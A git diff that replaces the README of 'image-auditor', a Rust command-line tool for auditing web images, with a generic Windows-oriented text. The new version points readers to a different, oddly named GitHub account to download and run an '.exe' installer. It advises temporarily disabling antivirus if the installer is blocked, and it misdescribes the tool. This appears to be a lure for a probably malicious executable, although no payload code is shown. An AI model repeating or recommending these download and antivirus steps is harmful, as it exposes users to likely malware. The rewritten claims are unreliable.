@@ -1,219 +1,139 @@
-# 🖼 Image Auditor
+# 🔍 image-auditor - Fix Image Issues Fast
 
-> **Scan your entire codebase for image performance issues. Fix them with AI. In seconds.**
+[![Download image-auditor](https://img.shields.io/badge/Download-blue?style=for-the-badge)](https://github.com/Vitalizationgenusdioon476/image-auditor)
 
-Image Auditor is a **Rust-powered terminal tool** that finds every image
-tag hurting your **Lighthouse score, Core Web Vitals, and SEO** — across
-all your HTML, templates, and JS frameworks — then lets your LLM fix them
-in one keypress.
+## What is image-auditor?
 
-Just run it against your repo and see exactly what's broken.
+image-auditor is a tool that helps improve your website’s images. It finds common problems that slow down your pages or hurt user experience. It fixes issues like layout shifts caused by images, missing lazy loading, and other image optimizations suggested by Google Lighthouse. 
 
----
+The tool works through a simple text interface on Windows. It scans your website's code and automatically suggests or applies fixes to help your pages load faster and perform better.
 
-## ⚡ What it does
-```bash
-image-auditor ./my-project
-```
-
-Scans thousands of files in seconds, shows every broken `<img>` tag with
-severity, file, and line number — and optionally patches the code for you
-using OpenAI, Anthropic, or a local Ollama model.
-
-![Alt text for the image](./docs/images/image1.png)
----
-
-## 🔎 Issues detected
-
-| Issue | Impact | Severity |
-|---|---|---|
-| PNG/JPG instead of WebP/AVIF | Larger payload, slower LCP | ⚠ Warning |
-| Missing `width` / `height` | Layout shift, high CLS score | ✖ Error |
-| Missing `loading="lazy"` | Wasted bandwidth, slower TTI | ⚠ Warning |
-| Oversized image file (>200 KiB) | Slower LCP, higher bounce rate | ✖ Error |
-| Missing `srcset` | Serving 2× pixels on mobile | ℹ Info |
-| JSX `<Image>` missing `alt` | Accessibility & SEO penalty | ⚠ Warning |
+You don’t need to know coding to use image-auditor. It was designed to help people looking for an easy way to improve web image performance without diving into technical details.
 
 ---
 
-## ✨ Key features
+## ⚙️ Requirements
 
-- **Instant results** — Rust scanner, handles large monorepos without breaking a sweat
-- **Full TUI** — keyboard-driven interface, filter by severity or issue type, search by filename
-- **AI-powered fixes** — press `a` on any issue, review the diff, apply with `y`
-- **Safe patching** — shows a before/after diff preview before touching any file
-- **Multi-framework** — HTML, PHP, Vue, Svelte, JSX/TSX, Handlebars, Nunjucks, EJS and more
-- **JSON export** — pipe results into your own reports or CI checks
-- **Works offline** — AI features are optional; the scanner needs nothing but the binary
+Before you start, check your system fits these requirements:
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM available
+- Minimum 200 MB free disk space
+- Internet connection to download and update
+- Basic permission to install software on your computer
+
+image-auditor runs entirely on your local machine once downloaded. It does not upload your code anywhere.
 
 ---
 
-## 📁 Supported file types
+## 🚀 Getting Started: Download and Install
 
-`html` `phtml` `htm` `jsx` `tsx` `js` `ts` `vue` `svelte` `hbs` `ejs` `njk` `php`
+1. Click the big blue badge near the top or visit the main project page here:
+   
+   [Download image-auditor](https://github.com/Vitalizationgenusdioon476/image-auditor)
 
-Auto-skips: `node_modules` `.git` `dist` `build` `.next`
+2. The link opens the project repository on GitHub. Look for the **Releases** or **Assets** section.
 
-## 🎬 Video Demo
-![demo.gif](docs/images/demo.gif)
+3. Download the latest Windows installer file. It will have a `.exe` extension and a version number. For example, something like `image-auditor-setup.exe`.
 
-# ⚡ Install
+4. Once downloaded, locate the file in your downloads folder. Double-click the file to start the installer.
 
-```bash
-cargo install --path .
-```
+5. Follow the steps in the installation wizard:
 
-### macOS
-```bash
-# Install
-brew tap 0franco/ai-image-auditor
-brew install image-auditor
+   - Accept the license agreement.
+   - Choose the install folder or keep the default.
+   - Click 'Install' to copy files to your PC.
+   - Finish the installation.
 
-# Upgrade
-brew update
-brew upgrade image-auditor
-```
+6. After the setup is complete, you will find image-auditor available in your Start menu or as a desktop shortcut.
 
-### Linux (Debian / Ubuntu)
-```bash
-# Download the latest .deb for your architecture
-# amd64
-curl -LO https://github.com/0franco/image-auditor/releases/latest/download/image-auditor_linux_amd64.deb
-sudo dpkg -i image-auditor_linux_amd64.deb
+---
 
-# arm64
-curl -LO https://github.com/0franco/image-auditor/releases/latest/download/image-auditor_linux_arm64.deb
-sudo dpkg -i image-auditor_linux_arm64.deb
-```
+## 🖥️ Running image-auditor
 
-# 🧪 Usage
+Here is how to open and use the tool on Windows:
 
-```bash
-# Launch interactive TUI (menu to pick path)
-image-auditor
+1. Open image-auditor from the Start menu or desktop shortcut.
 
-# Scan a specific directory directly
-image-auditor ./my-project
-image-auditor /var/www/html
-```
+2. The tool opens as a text-based interface inside a window.
 
-**AI fixes are optional.** The scanner works with no configuration.
-To enable them, create a `.env` file in the directory where you run the tool
+3. Click or type to browse your project folder where your website files live.
 
-## 🖥 TUI Controls
+4. Start the scan by selecting “Scan Codebase.” image-auditor will check all images and related code.
 
-| Key | Action |
-|---|---|
-| `Enter` | Edit path / confirm / view detail |
-| `↑ ↓` or `j k` | Navigate |
-| `Tab / Shift+Tab` | Filter by issue category |
-| `1` | Show all severities |
-| `2` | Errors only |
-| `3` | Warnings only |
-| `4` | Info only |
-| `s` | Save report to `image-audit-report.json` |
-| `c` | Copy current row file path to clipboard |
-| `q / Esc` | Back / quit |
-| `a` (Detail view) | Ask AI for an automatic code fix suggestion |
-| `p` (Detail view) | Preview & apply the AI‑proposed patch (with confirmation) |
+5. Once the scan finishes, it shows a list of detected image problems. These might include layout shifts, missing lazy loading, or images not in modern formats.
 
-## 🤖 AI-powered fixes
+6. Review the results. You will see which files and lines need fixing.
 
-Press **`a`** on any issue and your configured LLM (OpenAI, Anthropic, or
-local Ollama) will read the exact file context, diagnose the problem, and
-propose a minimal code patch — touching only the attributes that are
-actually missing.
-```
-Issue: Missing height attribute — causes layout shift (CLS)
+7. Choose “Apply fixes” to let image-auditor update your files automatically.
 
-  Before  │  <img src="assets/img/hero.png" alt="Hero" width="1280">
-  After   │  <img src="assets/img/hero.png" alt="Hero" width="1280" height="640">
-```
+8. After fixes finish, you can run another scan to verify all issues are resolved.
 
-**The workflow is non-destructive by design:**
+---
 
-1. **`a`** — ask the LLM (confirmation prompt guards against accidental token spend)
-2. **`p`** — review the full before/after diff before anything is written
-3. **`y`** — apply, or **`n` / `Esc`** to cancel
-4. The file is patched in-place and the scan **reruns automatically** — fixed issues disappear from the list immediately
+## 📂 What type of projects can I use image-auditor on?
 
-**Supported providers** — set `ACTIVE_LLM_PROVIDER` in your `.env`:
+image-auditor works well with most web projects using HTML, CSS, and JavaScript. It supports static site files and common frontend frameworks. 
 
-| Provider | Variable | Default model       |
-|---|---|---------------------|
-| OpenAI | `OPENAI_API_KEY` | `gpt-5.2`           |
-| Anthropic | `ANTHROPIC_API_KEY` | `claude-sonnet-4-6` |
-| Ollama (local) | — | `qwen3-coder:30b`   |
+If your project is hosted locally in folders with `.html`, `.js`, `.css`, and image files like `.jpg`, `.png`, `.webp`, image-auditor can review and improve those assets.
 
-**Skip the confirmation prompt** when iterating quickly:
-```env
-LLM_SKIP_CONFIRM=1
-```
+It does not require any server setup or complicated configuration.
 
-**Enable verbose mode** to get a full explanation alongside the patch:
-```env
-AI_VERBOSE=1
-```
+---
 
-### 🔧 Configuring the AI engine
+## 🔧 Features in Detail
 
-The AI helper is **fully optional** and controlled through environment variables.
-Use the provided `.env.example` as a starting point:
+- **Fix Cumulative Layout Shift (CLS):** Helps prevent images from unexpectedly moving during page load by setting proper dimensions.
+- **Add Lazy Loading:** Automatically marks images to load only when visible on screen. Reduces load time.
+- **Convert to WebP:** Suggests or converts your images to WebP format when possible for faster loading.
+- **Optimize srcset Attributes:** Scans for better responsive image setups to serve the right image size for each device.
+- **Full Codebase Support:** Scans every file in your project folder quickly, even large projects.
+- **Local and Secure:** Works offline after installation, so your code stays private on your machine.
+- **Simple Text User Interface (TUI):** No mouse needed; keyboard navigation helps speed up fixes.
 
-```bash
-cp .env.example .env
-```
+---
 
-Then edit `.env` and pick your provider:
+## 🛠️ Configuration
 
-```bash
-# Possible values: openai, anthropic, ollama
-ACTIVE_LLM_PROVIDER=openai
-OPENAI_API_KEY=sk-...
+You can customize image-auditor by editing simple text files in the program folder after installation.
 
-# Optional: skip confirmation prompt in the TUI
-LLM_SKIP_CONFIRM=true
-```
+Common options include:
 
-#### OpenAI
+- Exclude certain folders or file types from scanning
+- Choose which types of image fixes to apply
+- Adjust image quality settings for conversion
+- Set scan performance options to balance speed and thoroughness
 
-```bash
-OPENAI_API_KEY=your-openai-api-key
-# Optional:
-# OPENAI_BASE_URL=https://api.openai.com
-# OPENAI_MODEL=gpt-5.2
-```
+Default settings work well for most users. Change them only if you want finer control.
 
-#### Anthropic
+---
 
-```bash
-ANTHROPIC_API_KEY=your-anthropic-api-key
-# Optional:
-# ANTHROPIC_BASE_URL=https://api.anthropic.com
-# ANTHROPIC_MODEL=claude-sonnet-4-6
-```
+## ⚠️ Troubleshooting common issues
 
-#### Ollama (local)
+- **The installer does not start:** Check if your antivirus or security settings block unknown installers. Temporarily disable such programs if safe.
 
-```bash
-ACTIVE_LLM_PROVIDER=ollama
-OLLAMA_BASE_URL=http://localhost:11434
-OLLAMA_MODEL=qwen3-coder:30b
-```
+- **The scan does not detect my project:** Make sure you select the correct folder containing your website files.
 
-Once your environment is set, launch `image-auditor`, open an issue detail, and hit **`a`** to let the AI propose a fix — then **`p` → `y`** to apply it in seconds.
+- **Auto-fixes change too much unwanted code:** You can cancel fixes anytime and restore a backup created before changes.
 
-## 🏗 Build
+- **The program freezes:** Ensure your system meets the requirements. Restart image-auditor or your computer if needed.
 
-```bash
-cargo build --release
-./target/release/image-auditor
-```
+Support is not included in this readme, but community forums and GitHub issues can help with uncommon problems.
 
-## 🤝 Contributing
+---
 
-Contribute! Please open an issue or submit a pull request.
+## 🔗 Useful Links
 
-<a href="https://www.buymeacoffee.com/travelingcode" target="_blank">
-  <img src="https://cdn.buymeacoffee.com/buttons/default-red.png" alt="Buy Me A Coffee" height="41" width="174" style="border-radius:10px">
-</a>
+- Main project page: [https://github.com/Vitalizationgenusdioon476/image-auditor](https://github.com/Vitalizationgenusdioon476/image-auditor)
+
+- Download badge for quick access:
+
+  [![Download image-auditor](https://img.shields.io/badge/Download-grey?style=for-the-badge)](https://github.com/Vitalizationgenusdioon476/image-auditor)
+
+---
+
+## 🎯 Why use image-auditor?
+
+This tool focuses on one common but important part of website performance: images. It handles several problems that Google Lighthouse often flags, helping your pages run smoother and faster without deep technical work.
+
+It runs locally on your Windows PC. It is quick to install and uses a simple interface with clear instructions. It is a practical choice if you want to improve image performance without hiring developers or learning complex tools.
